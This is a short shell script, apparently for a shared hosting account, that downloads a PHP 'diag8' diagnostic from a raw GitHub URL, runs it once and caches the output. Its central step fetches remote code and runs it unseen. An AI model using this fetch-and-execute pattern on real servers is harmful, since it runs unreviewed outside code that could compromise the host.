#!/bin/sh
# runs diag8 once (later runs show the saved output)
D=/home/u791571885/dg8; mkdir -p $D; cd $D || exit 1
[ -f out.txt ] && { cat out.txt; exit 0; }
curl -fsSL -o d8.php https://raw.githubusercontent.com/a04032417-svg/Dar/37ce94ec3fd2276988091fc4f6d7aabd96ca18e4/diag8.php
/opt/alt/php83/usr/bin/php d8.php > out.tmp 2>&1; mv out.tmp out.txt; cat out.txt
